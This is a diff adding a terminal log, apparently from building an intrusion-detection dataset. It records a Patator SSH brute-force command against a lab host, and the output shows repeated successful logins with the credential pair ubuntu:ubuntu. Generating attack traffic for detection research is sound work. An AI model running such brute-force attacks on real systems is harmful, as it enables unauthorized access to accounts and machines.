@@ -1,0 +1,34 @@
+ubuntu@Ubuntu-20-04:~/intrusion-detection-dataset/patator$ patator ssh_login host=33.33.33.220 user=FILE0 0=user.txt password=FILE1 1=password.txt -x ignore:mesg='Authentication failed.'
+21:39:31 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2023-09-25 21:39 CST
+21:39:31 patator    INFO -                                                                              
+21:39:31 patator    INFO - code  size    time | candidate                          |   num | mesg
+21:39:31 patator    INFO - -----------------------------------------------------------------------------
+21:40:18 patator    INFO - 0     30     0.061 | ubuntu:ubuntu                      |   164 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:20 patator    INFO - 0     30     0.014 | ubuntu:ubuntu                      |   175 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:21 patator    INFO - 0     30     0.064 | ubuntu:ubuntu                      |   167 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:21 patator    INFO - 0     30     0.063 | ubuntu:ubuntu                      |   177 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:21 patator    INFO - 0     30     0.063 | ubuntu:ubuntu                      |   187 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:25 patator    INFO - 0     30     0.013 | ubuntu:ubuntu                      |   183 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:25 patator    INFO - 0     30     0.014 | ubuntu:ubuntu                      |   188 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:56 patator    INFO - 0     30     0.062 | ubuntu:ubuntu                      |   327 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:56 patator    INFO - 0     30     0.064 | ubuntu:ubuntu                      |   337 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:40:56 patator    INFO - 0     30     0.072 | ubuntu:ubuntu                      |   347 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:41:03 patator    INFO - 0     30     0.065 | ubuntu:ubuntu                      |   324 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:41:06 patator    INFO - 0     30     0.013 | ubuntu:ubuntu                      |   348 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:41:07 patator    INFO - 0     30     0.014 | ubuntu:ubuntu                      |   343 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:41:08 patator    INFO - 0     30     0.011 | ubuntu:ubuntu                      |   335 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:48 patator    INFO - 0     30     0.066 | ubuntu:ubuntu                      |   903 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:48 patator    INFO - 0     30     0.068 | ubuntu:ubuntu                      |   913 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:48 patator    INFO - 0     30     0.070 | ubuntu:ubuntu                      |   923 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:48 patator    INFO - 0     30     0.064 | ubuntu:ubuntu                      |   900 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:50 patator    INFO - 0     30     0.011 | ubuntu:ubuntu                      |   924 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:51 patator    INFO - 0     30     0.016 | ubuntu:ubuntu                      |   919 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:53 patator    INFO - 0     30     0.011 | ubuntu:ubuntu                      |   911 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:59 patator    INFO - 0     30     0.062 | ubuntu:ubuntu                      |   967 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:59 patator    INFO - 0     30     0.065 | ubuntu:ubuntu                      |   977 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:43:59 patator    INFO - 0     30     0.063 | ubuntu:ubuntu                      |   987 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:44:01 patator    INFO - 0     30     0.063 | ubuntu:ubuntu                      |   964 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:44:03 patator    INFO - 0     30     0.014 | ubuntu:ubuntu                      |   983 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:44:08 patator    INFO - 0     30     0.012 | ubuntu:ubuntu                      |   988 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:44:08 patator    INFO - 0     30     0.010 | ubuntu:ubuntu                      |   975 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+21:44:31 patator    INFO - Hits/Done/Skip/Fail/Size: 28/1024/0/0/1024, Avg: 3 r/s, Time: 0h 4m 59s
